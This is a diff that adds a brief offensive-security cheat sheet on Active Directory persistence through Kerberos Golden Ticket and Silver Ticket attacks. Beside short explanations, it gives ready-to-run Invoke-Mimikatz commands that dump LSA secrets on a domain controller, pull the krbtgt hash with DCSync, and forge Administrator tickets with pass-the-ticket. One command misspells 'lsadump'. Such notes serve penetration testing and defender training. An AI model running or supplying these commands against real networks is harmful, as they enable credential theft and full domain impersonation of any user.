@@ -1,0 +1,43 @@
+PERSISTENCE TECHNIQUES
+Golden Ticket Attack
+
+A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valiod TGT ticket 
+
+Since user account validation is not done by Domain Controller (KDC Service) until TGT is older than 20 minutes, we can even use deleted/revoked accounts
+
+The KRBTGT user hash could be used to impersonate any user with any privileges from even a non-domain machine
+
+Single Password Change has no effect on this attack
+
+A Couple of examples of commands
+
+Execute Mimikatz on DC
+
+Invoke-Mimikatz -Command '"lasdump::lsa /patch"' -Computername dc01
+
+Execute MimiKatz on any machine
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:victim.local /sid:<domain sid> /krbtgt:<krbtgt ntlm hash> /id:500 /groups:513 /ptt"'
+
+To use the DCSync feature for getting krbtgt hash, execute the below command with DA privileges for ops domain
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:victim.local\krbtgt"'
+
+
+
+SIlver Ticket Attack
+
+A Valid TGS (Golden Ticket is TGT)
+
+Encrypted and Signed by the NTLM hash of the service account - (Golden Ticket is signed by the hash of the KRBTGT) of the service running with that account
+
+Services rarely check PAC (Privileged Attribute Certificate)
+
+Services will allow access only to the services themselves
+
+Create Silver ticket
+
+Invoke-MimiKatz -Command '"kerberos::golden /domain:victim.local /sid:<domain sid> /target:<target machine> /service:cifs /rc4:<NTLM hash of machine account> /id:500 /user:Administrator /ptt"'
+
+
+
